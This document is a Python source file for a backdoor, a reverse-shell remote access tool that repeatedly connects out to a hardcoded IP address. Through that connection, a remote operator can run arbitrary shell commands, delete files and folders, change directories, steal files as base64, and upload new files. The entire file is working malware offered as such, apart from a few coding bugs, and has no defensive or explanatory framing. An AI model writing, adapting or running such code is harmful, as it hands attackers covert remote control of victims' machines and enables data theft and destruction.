#!/usr/bin/env python3

import socket
import subprocess
import json
import os
import base64


class Backdoor:

	
	def __init__(self, ip, port):
		self.ip = ip
		self.port = port

		self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.connection.connect((self.ip, self.port))

	
	def reliable_send(self, data):
		json_data = json.dumps(data)
		self.connection.send(json_data)

	
	def reliable_receive(self):
		json_data = ''

		while True:
			try:
				json_data += self.connection.recv(1024)
				return json.loads(json_data)
			except ValueError:
				continue

	
	def change_dir_to(self, path):
		try:
			# path having space at the end
			os.chdir(path)
			return "[+] change_dir_to " + path
		except WindowsError:
			return "[-] " + path + " Invalid Path [-]"

	
	def read_files(self, path):
		try:
			with open(path, 'rb') as file:
				return base64.b64encode(file.read())
		except IOError:
			return '0'

	def write_files(self, path, message):
		with open(path, 'wb') as file:
			file.write(message)


	def run_command(self, receive_command):
		if receive_command[0] == 'exit':
			self.connection.close()
			exit()
		
		elif receive_command[0] == 'rmdir':
			
			file_name = ''
			for i in receive_command:
				if i != 'rmdir':
					file_name += i
					file_name += ' '

				file_name = file_name[0:len(file_name)-1]

			os.rmdir(receive_command[1])

		elif receive_command[0] == 'rm':
			file_name = ''
			for i in receive_command:
				if i != 'rm':
					file_name += i
					file_name += ' '

				file_name = file_name[0:len(file_name)-1]
			
			os.remove(file_name)

		elif receive_command[0] == 'cd' and len(receive_command) > 1:	
			path = ''
			for i in receive_command:
				if i != 'cd':
					path += i
					path += ' '
			
			# Removing " " space at the end
			path = path[0:len(path)-1]
			result = self.change_dir_to(path)
		
		elif receive_command[0] == 'download' and len(receive_command) > 1:
			
			result = self.read_files(receive_command[1])
			
								

		elif receive_command[0] == 'upload':
			file_name = receive_command[1]
			self.write_files(file_name, base64.b64decode(receive_command[2]))
			result = "[+] File uploaded Successfully"

		else: 
			try:
				result = subprocess.check_output(receive_command)
			except subprocess.CalledProcessError:
				result = '[-] Command Not Found (-_-) [-]'

		
		return result
	
	def main(self):

		while True:
			try:
				# data cointains "<built-in function command>" removing "<built-in function " and ">"
				recieved_data = self.reliable_receive()
				# filtered_data = recieved_data.replace('<built-in function ', '')
							
				result = self.run_command(recieved_data)
			except Exception:
				result = "[?] Unkown Error Accured (*_*?) [?]"
			self.reliable_send(result)
while True:
	
	try:
		backdoor = Backdoor('192.168.42.79', 80)
		backdoor.main()
	except socket.error:
		pass